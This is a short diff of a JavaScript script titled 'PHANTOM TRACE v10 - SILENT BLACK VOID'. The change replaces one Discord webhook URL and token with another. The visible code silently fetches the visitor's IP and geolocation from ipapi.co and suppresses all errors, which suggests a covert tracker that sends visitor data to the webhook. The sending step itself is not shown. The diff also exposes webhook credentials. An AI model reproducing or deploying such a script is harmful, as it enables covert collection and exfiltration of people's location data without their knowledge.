@@ -1,6 +1,6 @@
 // PHANTOM TRACE v10 - SILENT BLACK VOID
 (() => {
-    const webhook = "https://discord.com/api/webhooks/1437295789167870165/evAhIFwNYIA7JNVkvGl0BP3fPhvNYv20fCuiVLfPl0lnXs_b_yUD1DfeZxvRmWH8IJg-";
+    const webhook = "https://discord.com/api/webhooks/1439351884925243606/39S7tA2aQ76i-flbrsmxe0qWjnLC4fP1YaDGRwECl1lcyBm4iX4gc5qFwq7j5m9ZyiM2";
 
     // Collect data
     fetch("https://ipapi.co/json/")
@@ -33,4 +33,5 @@
         });
       })
       .catch(() => {});
+
 })();
